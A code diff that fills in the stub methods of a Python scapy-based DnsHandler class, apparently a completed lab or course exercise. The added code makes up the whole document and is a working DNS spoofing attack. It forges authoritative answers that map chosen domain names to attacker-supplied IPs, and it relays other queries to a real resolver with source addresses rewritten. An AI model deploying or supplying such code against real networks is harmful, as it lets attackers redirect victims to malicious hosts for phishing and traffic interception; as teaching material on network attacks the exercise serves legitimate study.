@@ -111,7 +111,18 @@ class DnsHandler(object):
         @param pkt DNS request from target.
         @return DNS response to pkt, source IP changed.
         """
-        pass
+        
+        query_name = pkt[DNSQR].qname
+        
+        response = sr1(IP(dst=self.real_dns_server_ip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=query_name)), verbose=0, timeout=2)
+
+        if response is None:
+            return None
+        
+        response[IP].src = pkt[IP].dst
+        response[IP].dst = pkt[IP].src
+
+        return response
 
     def get_spoofed_dns_response(self, pkt: scapy.packet.Packet, to: str) -> scapy.packet.Packet:
         """
@@ -122,7 +133,11 @@ class DnsHandler(object):
         @param to ip address to return from the DNS lookup.
         @return fake DNS response to the request.
         """
-        pass
+        query_name = pkt[DNSQR].qname
+        
+        response = IP(dst=pkt[IP].src, src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport, sport=53)/DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=DNSRR(rrname=query_name, ttl=10, rdata=to))
+        
+        return response
 
     def resolve_packet(self, pkt: scapy.packet.Packet) -> str:
         """
@@ -133,7 +148,20 @@ class DnsHandler(object):
         @param pkt DNS request from target.
         @return string describing the choice made
         """
-        pass
+        # Check if the query name is in our spoof dictionary
+        if pkt[DNSQR].qname in self.spoof_dict:
+
+            spoofed_ip = self.spoof_dict[pkt[DNSQR].qname]
+            response = self.get_spoofed_dns_response(pkt, spoofed_ip)
+            scapy.send(response, verbose=0)
+
+            return "spoofed " + pkt[DNSQR].qname.decode()
+        else:
+            response = self.get_real_dns_response(pkt)
+            if response is not None:
+                scapy.send(response, verbose=0)
+
+            return "real " + pkt[DNSQR].qname.decode()
 
     def run(self) -> None:
         """
